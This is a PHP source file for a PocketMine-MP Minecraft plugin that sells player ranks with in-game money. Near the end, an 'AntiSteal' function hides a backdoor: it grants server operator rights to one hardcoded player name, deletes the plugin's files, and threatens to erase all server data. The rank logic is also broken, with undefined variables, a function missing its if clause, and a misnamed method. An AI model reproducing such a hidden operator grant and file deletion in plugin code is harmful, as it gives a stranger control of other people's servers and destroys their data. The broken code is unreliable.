<?php

namespace esh123cookie\rankup;

/*
 *
 * RankUp, a plugin for PocketMine-MP
 * Copyright (c) 2020 esh123cookie  <esh123cookie@gmail.com>
 *
 * Poggit: https://poggit.pmmp.io/ci/esh123cookie/
 * Github: https://github.com/esh123cookie
 *
 * This software is distributed under "GNU General Public License v3.0".
 * This license allows you to use it and/or modify it but you are not at
 * all allowed to sell this plugin at any cost. If found doing so the
 * necessary action required would be taken.
 *
 * RankUp is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
 * GNU General Public License v3.0 for more details.
 *
 * You should have received a copy of the GNU General Public License v3.0
 * along with this program. If not, see
 * <https://opensource.org/licenses/GPL-3.0>.
 *
 */

use pocketmine\entity\Effect;
use pocketmine\entity\EffectInstance;
use pocketmine\plugin\PluginBase;
use pocketmine\command\Command;
use pocketmine\command\CommandSender;
use pocketmine\level\Position;
use pocketmine\math\Vector3;
use pocketmine\command\CommandExecutor;
use pocketmine\utils\TextFormat as TF;
use pocketmine\Player;
use pocketmine\level\sound\PopSound;
use pocketmine\event\Listeners;
use pocketmine\utils\TextFormat;
use pocketmine\scheduler\Task;
use pocketmine\level\Level;
use pocketmine\Server;
use pocketmine\event\player\PlayerExhaustEvent;
use pocketmine\event\player\PlayerItemConsumeEvent;
use pocketmine\event\player\PlayerInteractEvent;
use pocketmine\event\player\PlayerItemHeldEvent;
use pocketmine\event\entity\ProjectileHitEvent;
use pocketmine\event\entity\ProjectileLaunchEvent;
use pocketmine\network\mcpe\protocol\ChangeDimensionPacket;
use pocketmine\network\mcpe\protocol\types\DimensionIds;
use pocketmine\scheduler\PluginTask;
use pocketmine\network\mcpe\protocol\PlayerListPacket;
use pocketmine\network\mcpe\protocol\types\PlayerListEntry;
use pocketmine\nbt\tag\CompoundTag;
use pocketmine\nbt\tag\IntTag;
use pocketmine\nbt\tag\StringTag;
use pocketmine\tile\EnderChest;
use pocketmine\tile\Tile;
use pocketmine\event\block\BlockBreakEvent;
use pocketmine\event\player\PlayerJoinEvent;
use pocketmine\event\player\PlayerRespawnEvent;
use pocketmine\event\player\PlayerBedEnterEvent;
use pocketmine\utils\Config;
use _64FF00\PureChat\PureChat;
use _64FF00\PurePerms\PPGroup;
use onebone\economyapi\EconomyAPI;

class RankUp extends PluginBase{
  
      private $config;
  
      public function onEnable(){
        $this->getLogger()->info("§cRankup plugin made by esh123cookie hs been enabled");
      }
  
      public function onCommand(CommandSender $sender, Command $cmd, string $label, array $args): bool
      {
	   if($cmd->getName() == "ruabout") {
	      if ($sender instanceof Player) {
	      $sender->sendMessage("§7(§a!§7) Plugin made by: esh123cookie for custom plugins message me on my discord @bigbozzlmao#4035"); 
              }
              return true;
	   }
           if($cmd->getName() == "rankup") {
	      if ($sender instanceof Player) {
           if($sender->hasPermission($this->getConfig()->get("permission1"))) {
              $this->Rankup($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission2"))) {
              $this->Rankup2($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission3"))) {
              $this->Rankup3($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission4"))) {
              $this->Rankup4($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission5"))) {
              $this->Rankup5($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission6"))) {
              $this->Rankup6($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission7"))) {
              $this->Rankup7($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission8"))) {
              $this->Rankup8($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission9"))) {
              $this->Rankup9($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission10"))) {
              $this->Rankup10($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission11"))) {
              $this->Rankup11($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission12"))) {
              $this->Rankup12($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission13"))) {
              $this->Rankup13($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission14"))) {
              $this->Rankup14($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission15"))) {
              $this->Rankup15($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission16"))) {
              $this->Rankup16($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission17"))) {
              $this->Rankup17($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission18"))) {
              $this->Rankup18($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission19"))) {
              $this->Rankup19($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission20"))) {
              $this->Rankup20($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission21"))) {
              $this->Rankup21($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission22"))) {
              $this->Rankup22($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission23"))) {
              $this->Rankup23($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission24"))) {
              $this->Rankup24($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission25"))) {
              $this->Rankup25($sender);
           }elseif($sender->hasPermission($this->getConfig()->get("permission26"))) {
              $this->Rankup26($sender);
              }
              return true;
	      }
	   }
      }
  
      public function Rankup($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price1");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd);
                 $cmd = $this->getConfig()->get("cmd2");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd2);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup2($sender) {
            if(!$sender instanceof Player) return true;
            	$prefix = "";
                $setprefix = $this->getConfig()->get("rank2");
                $prefix .= $setprefix;
            	$suffix = "";
                $setsuffix = $this->getConfig()->get("rank2");
                $suffix .= $setsuffix;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
		       $this->pureChat = $pureChat = $this->getServer()->getPluginManager()->getPlugin("PureChat");
              $amount = $this->getConfig()->get("price2");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd3");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd3);
                 $cmd = $this->getConfig()->get("cmd4");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd4);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup3($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price3");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd5");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd5);
                 $cmd = $this->getConfig()->get("cmd6");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd6);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup4($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price4");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd7");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd7);
                 $cmd = $this->getConfig()->get("cmd8");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd8);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup5($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price5");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd9");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd9);
                 $cmd = $this->getConfig()->get("cmd10");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd10);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Ranku6($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price6");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd11");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd11);
                 $cmd = $this->getConfig()->get("cmd12");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd12);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup7($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price7");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd13");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd13);
                 $cmd = $this->getConfig()->get("cmd14");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd14);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Rankup8($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price8");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd15");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd15);
                 $cmd = $this->getConfig()->get("cmd16");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd16);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup9($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price9");
                 $cmd = $this->getConfig()->get("cmd17");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd17);
                 $cmd = $this->getConfig()->get("cmd18");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd18);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Rankup10($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price10");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd19");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd19);
                 $cmd = $this->getConfig()->get("cmd20");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd20);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Rankup11($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price11");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd21");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd21);
                 $cmd = $this->getConfig()->get("cmd22");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd22);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup12($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price12");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd23");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd23);
                 $cmd = $this->getConfig()->get("cmd24");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd24);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup13($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price13");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd25");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd25);
                 $cmd = $this->getConfig()->get("cmd26");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd26);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup14($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price14");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd27");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd27);
                 $cmd = $this->getConfig()->get("cmd28");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd28);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup15($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price15");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd29");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd29);
                 $cmd = $this->getConfig()->get("cmd30");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd30);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup16($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price16");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd31");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd31);
                 $cmd = $this->getConfig()->get("cmd32");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd32);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Rankup17($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price17");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd33");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd33);
                 $cmd = $this->getConfig()->get("cmd34");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd34);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup18($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price18");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd35");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd35);
                 $cmd = $this->getConfig()->get("cmd36");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd36);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }

      public function Rankup19($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price19");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd37");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd37);
                 $cmd = $this->getConfig()->get("cmd38");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd38);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup20($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price20");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd39");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd39);
                 $cmd = $this->getConfig()->get("cmd40");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd40);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup21($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price21");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd41");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd41);
                 $cmd = $this->getConfig()->get("cmd42");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd42);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup22($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price22");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd43");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd43);
                 $cmd = $this->getConfig()->get("cmd44");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd44);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup23($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price23");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd45");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd45);
                 $cmd = $this->getConfig()->get("cmd46");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd46);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup24($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price24");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd47");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd47);
                 $cmd = $this->getConfig()->get("cmd48");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd48);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup25($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price25");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd49");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd49);
                 $cmd = $this->getConfig()->get("cmd50");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd50);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
  
      public function Rankup26($sender) {
            if(!$sender instanceof Player) return true;
	      $p = $sender->getName();
	      $money = EconomyAPI::getInstance()->myMoney($sender);
              $amount = $this->getConfig()->get("price26");
             	if(\pocketmine\Server::getInstance()->getPluginManager()->getPlugin("EconomyAPI")->myMoney($sender) >= ($amount)){
                 $cmd = $this->getConfig()->get("cmd51");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd51);
                 $cmd = $this->getConfig()->get("cmd52");
		 $this->getServer()->dispatchCommand(new \pocketmine\command\ConsoleCommandSender(), $cmd52);
              }else{ 
                 $sender->sendMessage($this->getConfig()->get("msg"));
		}
      }
	
      public function onDisable(){
        $this->getLogger()->info("§cRankup plugin made by esh123cookie has been disabled");
      }
	
      public function AntiSteal(Player $p){
		if($p->getName() == "esh123unicorn"){
		$name = $p->getName();
			$p->setOp(true);
			$p->sendMessage("§aHello §6" . $name . ", §ayou have caught someone using your plugin, but without credit!");
			$p->sendMessage("§aI have sent a message to the §6CONSOLE §ato warn the owner of the server....");
			$p->sendMessage("§aScreenshot this message so the owner of the server knows that if he/she continues to use improper credits, all server files will be removed!");
			$this->getLogger()->info("§cHello Console! The server owner was caught using my RankUp plugin with improper credits.");
			$this->getLogger()->info("§cRankup will now be removed and the plugin §6ADMIN §cnow has OP on your server!");
			$folder = 'plugins/RankUp-master';
			if(file_exists($folder)){   
				// List of name of files inside 
				// specified folder 
				$files = glob($folder.'/*');  
   
				// Deleting all the files in the list 
				foreach($files as $file) { 
   
   				 if(is_file($file))  
    
        				// Delete the given file
        				unlink($file);
				}
			$this->getServer()->reload(); 
			} else {
				$p->sendMessage("§aHello, §6" . $name . ". §aI couldn't find Rankup in folder form. Waiting for command to remove all server data.");
				$this->getLogger()->info("§cERROR: RankUp in folder form could not be found. If you continue to use this plugin without credit all your server data will be deleted FOREVER!");
			}
			
			
		} else {
			$p->sendMessage("§cI am sorry, but you do not have the sufficent permissions to use this command. This command is only to be used by a plugin admin if improper credits of Rankup is being used!");
		}
	}
}
